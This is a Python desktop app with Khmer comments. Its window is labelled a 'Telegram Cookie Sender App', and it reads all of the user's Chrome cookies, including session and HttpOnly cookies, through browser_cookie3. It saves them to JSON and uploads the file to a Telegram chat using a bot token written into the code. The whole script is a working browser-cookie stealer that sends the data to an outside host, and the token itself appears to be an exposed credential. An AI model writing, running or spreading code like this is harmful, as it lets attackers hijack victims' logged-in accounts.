import os
import json
import browser_cookie3
import PySimpleGUI as sg
from telegram import Bot

# === ប្ដូរតាមរបស់បង ===
TELEGRAM_BOT_TOKEN = "7501324894:AAFzTZ69LM8i-oQfl5WcR6_M2LJCUeeShbk"
TELEGRAM_CHAT_ID = "12345"  # អាចជាខ្លួន user ឬ group
OUTPUT_FOLDER = 'cookies_export'
OUTPUT_FILENAME = 'cookies.json'

def export_cookies_to_json(domain_filter=None, output_folder=OUTPUT_FOLDER, output_filename=OUTPUT_FILENAME):
    cj = browser_cookie3.chrome()
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    cookies_list = []

    for cookie in cj:
        if domain_filter and domain_filter not in cookie.domain:
            continue
        cookie_dict = {
            "name": cookie.name,
            "value": cookie.value,
            "domain": cookie.domain,
            "path": cookie.path,
            "secure": cookie.secure,
            "expires": cookie.expires,
            "httpOnly": cookie.has_nonstandard_attr('HttpOnly'),
        }
        cookies_list.append(cookie_dict)

    output_path = os.path.join(output_folder, output_filename)
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(cookies_list, f, ensure_ascii=False, indent=4)
    return output_path

def send_file_to_telegram(bot_token, chat_id, file_path, caption=None):
    bot = Bot(token=bot_token)
    with open(file_path, 'rb') as f:
        bot.send_document(chat_id=chat_id, document=f, caption=caption or "Here is your cookie JSON file")

def main():
    sg.theme('LightBlue2')
    layout = [
        [sg.Text('Telegram Cookie Sender App', font=('Arial', 16))],
        [sg.Text('Click button below to export Chrome cookies and send to your Telegram bot.')],
        [sg.Button('Export & Send Cookies', size=(20,2))],
        [sg.Multiline(size=(70,10), key='-OUTPUT-', disabled=True)]
    ]

    window = sg.Window('Cookie to Telegram', layout)

    while True:
        event, values = window.read()
        if event == sg.WINDOW_CLOSED:
            break
        elif event == 'Export & Send Cookies':
            window['-OUTPUT-'].update("Exporting cookies...\n")
            try:
                file_path = export_cookies_to_json()
                window['-OUTPUT-'].update(window['-OUTPUT-'].get() + f"Exported cookies to {file_path}\nSending to Telegram...\n")
                send_file_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, file_path)
                window['-OUTPUT-'].update(window['-OUTPUT-'].get() + "Sent cookie file to Telegram successfully!\n")
            except Exception as e:
                window['-OUTPUT-'].update(window['-OUTPUT-'].get() + f"Error: {e}\n")

    window.close()

if __name__ == "__main__":
    main()